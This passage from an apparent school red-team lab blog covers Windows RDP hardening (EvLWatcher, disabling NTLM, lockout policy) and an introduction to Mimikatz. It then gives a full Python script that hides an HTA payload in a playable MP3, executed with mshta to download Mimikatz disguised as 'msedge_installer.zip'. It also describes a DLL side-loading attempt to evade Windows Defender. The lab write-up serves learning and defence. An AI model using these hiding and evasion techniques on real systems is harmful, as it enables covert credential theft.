<h4 id="using-evlwatcher-for-rate-limiting">Using EvLWatcher for Rate Limiting<a hidden class="anchor" aria-hidden="true" href="#using-evlwatcher-for-rate-limiting">#</a></h4>
<p>To set up rate limiting, I used a <code>fail2ban</code>-style tool for Windows called EvLWatcher. After running the setup executable, no additional configuration is necessary, and it can essentially be left to run in the background. <!-- raw HTML omitted -->GitHub<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/evlwatcherf.png"/> <figcaption>
            Figure 23: Observing The Attackers IP-Address getting temporarily banned
        </figcaption>
</figure>

<h4 id="disabling-ntlm-authentication">Disabling NTLM Authentication<a hidden class="anchor" aria-hidden="true" href="#disabling-ntlm-authentication">#</a></h4>
<p>NTLM is a legacy authentication protocol that dates back to Windows NT. Although Microsoft introduced a more secure alternative called Kerberos in 1989, NTLM is still used in some domain networks and remains enabled for backward compatibility. One of NTLM&rsquo;s major flaws is that it stores password hashes in plaintext in the memory of its servers, which can be extracted using pass-the-hash tools such as Mimikatz. <!-- raw HTML omitted -->Windows OS Hub<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->Wikipedia<sup id="fnref1:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/disablentlm.png"/> <figcaption>
            Figure 24: Disabling NTLM authentication for all accounts
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/nontlm.png"/> <figcaption>
            Figure 25: Hydra failing without being able to use NTLM
        </figcaption>
</figure>
</p>
<h4 id="configuring-login-timeout-settings">Configuring Login Timeout Settings<a hidden class="anchor" aria-hidden="true" href="#configuring-login-timeout-settings">#</a></h4>
<p>To slow down RDP brute-forcing, account lockout can be configured in the Local Security Policy editor under Account Lockout Policy. <!-- raw HTML omitted -->The Windows Club<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/lockout.png"/> <figcaption>
            Figure 26: Showing the lockout policy
        </figcaption>
</figure>

<hr>
<h3 id="mimikatz-an-introduction">Mimikatz: An Introduction<a hidden class="anchor" aria-hidden="true" href="#mimikatz-an-introduction">#</a></h3>
<p>Mimikatz is a post-exploitation tool designed to extract credential information. <!-- raw HTML omitted -->Medium<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
<h4 id="what-can-mimikatz-do">What Can Mimikatz Do?<a hidden class="anchor" aria-hidden="true" href="#what-can-mimikatz-do">#</a></h4>
<p>The main features of Mimikatz include extracting credentials from memory or disk-based password stores. This includes plaintext passwords, PINs, Kerberos tickets, and NTLM password hashes. Mimikatz achieves this through a variety of techniques, such as Pass-the-Hash, which allows attackers to use captured NTLM hashes to create new authenticated sessions on the network—without needing to know the user’s actual password. <!-- raw HTML omitted -->CrowdStrike<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->MITRE ATT&amp;CK<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<ul>
<li><strong>Pass-the-Hash:</strong> Allows attackers to use captured NTLM hashes to create new authenticated sessions.</li>
<li><strong>Pass-the-ticket:</strong> Bypasses normal system access controls by stealing a valid Kerberos ticket.</li>
</ul>
<p>There are two notable types of forged Kerberos tickets: Silver and Golden tickets. <!-- raw HTML omitted -->Medium<sup id="fnref1:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->MITRE ATT&amp;CK<sup id="fnref1:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<h4 id="how-to-use-mimikatz">How to Use Mimikatz<a hidden class="anchor" aria-hidden="true" href="#how-to-use-mimikatz">#</a></h4>
<p>There are multiple ways to invoke Mimikatz on a target system. The simplest method is to download a compiled release from the official GitHub repository. However, there are also pre-built PowerShell scripts and commands that streamline its execution, such as Invoke-Mimikatz from the PowerSploit framework. <!-- raw HTML omitted -->PowerSploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="running-mimikatz">Running Mimikatz<a hidden class="anchor" aria-hidden="true" href="#running-mimikatz">#</a></h3>
<p>To run Mimikatz on the target system, I wanted to try a unique or more creative method rather than simply downloading and executing the Mimikatz binary directly. Inspired by a video from security professional and YouTuber John Hammond, where he analyzes a malware sample hidden inside an MP3 file that uses mshta.exe to execute a payload, I explored a similar idea. <!-- raw HTML omitted -->John Hammond<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --></p>
<p>To do this, I used an MP3 file in which I embedded the plain text of an HTA script that downloads Mimikatz. The MP3 file appears normal and can be played, but if executed using <code>mshta</code>, it executes the script.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/payload.png"/> <figcaption>
            Figure 27: Showing the payload in the mp3 file
        </figcaption>
</figure>

<p>The payload runs a PowerShell command in a hidden window that downloads Mimikatz and saves it as <code>msedge_installer.zip</code>.</p>
<p>To insert my payload into an MP3 file, I wrote the following Python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert_file</span>(target_path, payload_path, output_path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(target_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> target_file:
</span></span><span style="display:flex;"><span>            target_content <span style="color:#f92672">=</span> target_file<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(payload_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> payload_content:
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> payload_content<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        target_size <span style="color:#f92672">=</span> len(target_content)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> target_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Error: Target file is empty.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        middle_index <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        random_offset_range <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>        random_offset <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#f92672">-</span>random_offset_range, random_offset_range)
</span></span><span style="display:flex;"><span>        insertion_point <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, min(target_size, middle_index <span style="color:#f92672">+</span> random_offset))
</span></span><span style="display:flex;"><span>        new_content <span style="color:#f92672">=</span> target_content[:insertion_point] <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> target_content[insertion_point:]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(output_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> output_file:
</span></span><span style="display:flex;"><span>            output_file<span style="color:#f92672">.</span>write(new_content)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;File &#39;</span><span style="color:#e6db74">{</span>payload_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; inserted at position </span><span style="color:#e6db74">{</span>insertion_point<span style="color:#e6db74">}</span><span style="color:#e6db74"> in &#39;</span><span style="color:#e6db74">{</span>target_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and saved as &#39;</span><span style="color:#e6db74">{</span>output_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: One or both of the input files were not found.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    target_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link_orginal.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    file_to_insert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;payload.hta&#34;</span>
</span></span><span style="display:flex;"><span>    output_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    insert_file(target_mp3, file_to_insert, output_mp3)
</span></span></code></pre></div><p>Figures below show the properties of the edited file, its ability to be played back, and the execution of the file via <code>mshta</code> on the target user through RDP.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/link_properties.png"/> <figcaption>
            Figure 28: Showing the properties of the mp3 file
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/listentiogn%20to%20the%20mp3%20file.png"/> <figcaption>
            Figure 29: Listening to the mp3 file
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/exepayload.png"/> <figcaption>
            Figure 30: Executing the payload inside the mp3 file
        </figcaption>
</figure>
</p>
<p>The ZIP file can now be extracted, and Mimikatz can be executed. However, since the user has virtually no permissions—and Mimikatz requires elevated privileges—it had no practical use in this scenario.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/sadgemimikatz.png"/> <figcaption>
            Figure 31: Running privilege::debug in mimikatz
        </figcaption>
</figure>

<hr>
<h4 id="dll-side-loading-to-attempt-to-bypass-windows-defender">DLL Side-Loading to Attempt to Bypass Windows Defender<a hidden class="anchor" aria-hidden="true" href="#dll-side-loading-to-attempt-to-bypass-windows-defender">#</a></h4>
<p>DLL sideloading is a technique in which a built-in Windows binary is copied to a different path, and a custom-compiled DLL is placed in the same directory, hoping that the binary will load the malicious DLL instead of the intended one. To find such vulnerable binaries, there is a website called hijacklibs.net, which allows filtering DLLs by vendor and provides detection rules for each specific DLL. <!-- raw HTML omitted -->HijackLibs<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
<p>To create your own DLL, you need the Microsoft x64 Native Developer Tools. You can then write the code for your DLL and compile it using:</p>
<pre tabindex="0"><code>cl /LD DismCore.c user32.lib 
</code></pre><p>I tried bundling Mimikatz into the DLL and sideloading it via a built-in Windows executable in an attempt to bypass Windows Defender. However, it was detected anyway.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/dll-1.png"/> <figcaption>
            Figure 32: Opening a Messagebox with the dll
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/dll-2.png"/> <figcaption>
            Figure 33: Trying to run the script via the dll
        </figcaption>
</figure>
</p>
<hr>
<h4 id="how-to-detect-and-block-mimikatz">How to Detect and Block Mimikatz<a hidden class="anchor" aria-hidden="true" href="#how-to-detect-and-block-mimikatz">#</a></h4>
<p>There are a multitude of ways to prevent Mimikatz, most of which come down to restricting access. For example, configuring the &ldquo;Debug Program&rdquo; policy to be accessible only to local administrators, disabling outdated protocols such as <code>WDigest</code>, and enforcing strong password policies.</p>
<hr>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Microsoft Corporation. Server Message Block (SMB) Protocol Versions 2 and 3. <a href="https://winprotocoldoc.z19.web.core.windows.net/MS-SMB2/%5bMS-SMB2%5d.pdf">source</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Microsoft Community Hub. Controlling SMB Dialects. <a href="https://techcommunity.microsoft.com/blog/filecab/controlling-smb-dialects/860024">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Wikipedia. NTLMSSP. <a href="https://en.wikipedia.org/w/index.php?title=NTLMSSP&amp;oldid=990800521">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Microsoft Docs. [MS-SMB2]: SMB2 SESSION_SETUP Request. <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5a3c2c28-d6b0-48ed-b917-a86b2ca4575f">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Windows OS Hub. Managing Administrative Shares (Admin$, IPC$, C$) on Windows. <a href="https://woshub.com/enable-remote-access-to-admin-shares-in-workgroup/">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Wikipedia. Remote Desktop Protocol. <a href="https://en.wikipedia.org/w/index.php?title=Remote_Desktop_Protocol&amp;oldid=1245904842">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>Microsoft Docs. Credential Security Support Provider - Win32 apps. <a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>GitHub. devnulli/EvlWatcher: a &ldquo;fail2ban&rdquo; style modular log file analyzer for windows. <a href="https://github.com/devnulli/EvlWatcher">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>Windows OS Hub. Disable NTLM Authentication in Windows. <a href="https://woshub.com/disable-ntlm-authentication-windows">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>The Windows Club. How to restrict the number of Login attempts in Windows 11/10. <a href="https://www.thewindowsclub.com/how-to-restrict-the-number-of-login-attempts-in-windows-7">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>Medium. Detailed mimikatz guide. <a href="https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>CrowdStrike. What is a Pass-the-Hash Attack? <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>MITRE ATT&amp;CK. Use Alternate Authentication Material: Pass the Ticket. <a href="https://attack.mitre.org/techniques/T1550/003">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>PowerSploit. PowerShellMafia/PowerSploit. <a href="https://github.com/PowerShellMafia/PowerSploit">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>John Hammond. this MP3 file is malware. <a href="https://www.youtube.com/watch?v=25NvCdFSkA4">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>HijackLibs. dismcore.dll on HijackLibs. <a href="https://hijacklibs.net/entries/microsoft/built-in/dismcore.html">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
      <li><a href="http://localhost:1313/tags/it-sec/">It Sec</a></li>
      <li><a href="http://localhost:1313/tags/school/">School</a></li>
      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">silly blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
